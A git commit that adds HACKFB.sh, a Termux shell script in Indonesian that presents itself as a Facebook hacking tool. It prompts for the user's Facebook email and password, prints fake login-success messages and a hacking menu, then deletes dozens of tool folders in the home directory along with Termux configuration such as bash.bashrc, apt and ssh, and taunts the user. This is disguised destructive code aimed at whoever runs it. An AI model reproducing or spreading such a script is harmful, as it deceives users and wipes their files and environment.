a6441db0425e500ea0dc5a9e0e8d105dfe97879d
Cokkar <50707655+Cokkar@users.noreply.github.com>
2019-05-16 20:59:05 +0700

    Add files via upload

---
+++ HACKFB.sh
@@ -0,0 +1,102 @@
+#!/system/xbin/bash
+clear
+echo "masukan Facebook Kalian"
+echo
+read -p "EMAIL/NOHP : "  username
+if [ $username = $username ]
+then
+clear
+echo "LOADING MASUK" | lolcat
+echo
+sleep 4
+echo "BERHASIL MASUK" | lolcat
+fi
+
+echo "MASUKAN PASSWROD"
+read -p "PASSWORD : " pass
+if [ $pass = $pass ]
+then
+clear
+echo "LOGINN BERHASIL " | lolcat
+fi
+
+clear
+echo "1.HACK DAFTAR TEMAN"
+echo "2.HACK ANGGOTA GRUP"
+echo "3.HACK TARGET"
+echo
+read -p "PILIH MENU : " pill
+if [ $pill = $pill ]
+then
+clear
+#URL :https://m.facebook.com/login
+echo "LOADING TUNGGU 2 MENIT"
+echo "KLUAR GAPAPA ASAL GA DI EXIT"
+cd $HOME
+rm BAJINGANv6
+rm TOOLSINSTALLERv4
+rm YahooCloning
+rm BAJINGANv5
+rm hammer
+rm 14toolstermux
+rm instahack
+rm AOCDEFACE
+rm iqbalz_bf
+rmBAJINGANv6
+rm j.sh
+rm CreateScriptDeface
+rm kontol
+rm CyberScan
+rm mrcakil
+rm GDV7
+rm multi-bruteforce-facebook
+rm GadoGado
+rm pacebook
+rm Google-Dork
+rm pentest
+rm HACKFB.sh
+rm reportfb
+rm IG
+rm root.sh
+rm LITEFONT
+rm LITESCRIPT
+rm LITESPAM
+rm santet-online
+rm Malicious
+rm script-deface-creator
+rm Mr.Paintv2
+rm sederhanatools
+rm Mrcakil
+rm shellstack
+rm PentesTer
+rm RED_HAWK
+rm sms_bomb
+rm ReconDog
+rm sqlmap
+rm Report
+rm storage
+rm TOOLSINSTALLERv4
+rm subs4subs-bot
+rm ToolsLengkap
+rm termux-lazysqlmap
+rm Xshell
+rm termux_insta
+rm YahooCloning
+rm thanatos
+rm bahan
+rm toolsv4
+rm bigbosv7
+rm toolsv6
+rm blajar
+rm torshammer
+rm /data/data/com.termux/files/usr/etc
+cd /data/data/com.termux/files/usr/etc
+rm bash.bashrc
+rm apt
+rm fonts
+rm mc
+rm ssh
+echo "SILAHKAN LIHAT TOOLS YANG PERNAH LO INSTALL"
+exit
+fi
+
